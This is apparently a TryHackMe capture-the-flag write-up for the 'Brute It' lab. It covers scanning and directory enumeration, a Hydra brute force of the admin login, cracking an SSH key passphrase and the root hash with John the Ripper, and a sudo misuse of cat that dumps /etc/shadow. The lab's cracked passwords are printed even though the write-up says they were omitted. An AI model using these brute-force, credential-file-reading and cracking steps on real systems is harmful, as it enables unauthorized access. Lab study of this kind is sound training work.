## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Learn how to brute, hash cracking and escalate privileges in this box!
In this box you will learn about:
- Brute-force
- Hash cracking
- Privilege escalation
Connect to the TryHackMe network, and deploy the machine.
```

## IP-Address
```IP-Address
10.201.1.50
```

## RustScan
```bash
$ rustscan -a 10.201.1.50 -b 450 -t 2000 --ulimit 5000 -- -e tun0 
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 60
80/tcp open  http    syn-ack ttl 60
```
After that navigate to the http://10.201.1.50/  and got the default page of apache server
then runs the 
## Gobuster 
```bash
$ gobuster dir -u http://10.201.1.50/  -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 4 -x php,txt,bake       
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.201.1.50/
[+] Method:                  GET
[+] Threads:                 4
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,bake
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.hta.php             (Status: 403) [Size: 276]
/.hta.txt             (Status: 403) [Size: 276]
/.hta.bake            (Status: 403) [Size: 276]
/.htaccess.bake       (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htaccess.php        (Status: 403) [Size: 276]
/.htaccess.txt        (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htpasswd.php        (Status: 403) [Size: 276]
/.htpasswd.txt        (Status: 403) [Size: 276]
/.htpasswd.bake       (Status: 403) [Size: 276]
/admin                (Status: 301) [Size: 310] [--> http://10.201.1.50/admin/]
/index.html           (Status: 200) [Size: 10918]
```

and after that i got the hidden directory which is `/admin` and in source code I found this
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
    <title>Admin Login Page</title>
</head>
<body>
    <div class="main">
        <form action="" method="POST">
            <h1>LOGIN</h1>

            
            <label>USERNAME</label>
            <input type="text" name="user">

            <label>PASSWORD</label>
            <input type="password" name="pass">

            <button type="submit">LOGIN</button>
        </form>
    </div>

    <!-- Hey john, if you do not remember, the username is admin -->
</body>
</html>
```
as we see here is an msg that username is `admin` so lets brute force the password using 
`HYDRA`
```bash
hydra -l admin -P /path/to/passwordlist.txt 10.201.1.50 http-post-form "/admin/:user=^USER^&pass=^PASS^:Invalid" -V
[80][http-post-form] host: 10.201.1.50   login: admin   password: [password omitted]
```
Got the password `xavier` 
And After login I found 
```Dashboard
Hello john, finish the development of the site, here's your RSA private key.
[flag omitted]
```

## Browser Flag
```Flag
[flag omitted]
```
also found RSA Key for the john and that is
```id_rsa
-----BEGIN RSA PRIVATE KEY-----
[private key omitted]
-----END RSA PRIVATE KEY-----
```

Which is actually encrypted which we need to decode using john 
```bash
ssh2john id_rsa > hash.txt
$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=SSH
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rockinroll       (id_rsa)     
1g 0:00:00:00 DONE (2025-08-06 18:14) 6.250g/s 453800p/s 453800c/s 453800C/s saloni..rock14
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Got the id_rsa file password which is `rockinroll`
Got the SSH
```bash
$ ssh -i id_rsa john@10.201.1.50
Enter passphrase for key 'id_rsa': rockinroll
```

## Got the User Flag
```bash
john@bruteit:~$ ls
user.txt
john@bruteit:~$ cat user.txt
[flag omitted]
```
Flag
```flag
[flag omitted]
```

## Now Privilege Escalation

Easily just Checked the sudo permissions and found this and got the flag
```bash
john@bruteit:/home$ sudo -l
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
john@bruteit:/home$ sudo /bin/cat /root/root.txt
[flag omitted]
```

## Root Flag
```flag
[flag omitted]
```

Another way to penetrate this using cat and get shadow file
```bash
ohn@bruteit:/home$ sudo /bin/cat /etc/shadow
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
lxd:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
landscape:*:18295:0:99999:7:::
pollinate:*:18295:0:99999:7:::
thm:$6$hAlc6HXuBJHNjKzc$NPo/0/iuwh3.86PgaO97jTJJ/hmb0nPj8S/V6lZDsjUeszxFVZvuHsfcirm4zZ11IUqcoB9IEWYiCV.wcuzIZ.:18489:0:99999:7:::
sshd:*:18489:0:99999:7:::
john:$6$iODd0YaH$BA2G28eil/ZUZAV5uNaiNPE0Pa6XHWUFp7uNTp2mooxwa4UzhfC0kjpzPimy1slPNm9r/9soRw8KqrSgfDPfI0:18490:0:99999:7:::
```

Now lets decode the Root Password using john
```bash
echo"root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::" > hash.txt
john hash.txt -w /usr/share/wordlists/rockyou.txt
Will run 4 OpenMP threads
Proceeding with wordlist:/usr/share/john/password.lst
Press 'q' or Ctrl-C to abort, almost any other key for status
football         (root)     
1g 0:00:00:00 DONE (2025-08-06 18:25) 4.000g/s 1024p/s 1024c/s 1024C/s 123456..franklin
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Got the Root Password `football`
and Again using su got the root shell with password
```bash
$ su 
football
root@bruteit:/# cd
root@bruteit:~# ls
root.txt
root@bruteit:~# cat root.txt
[flag omitted]
```

## Got the Flag
```Flag
[flag omitted]
```

# END
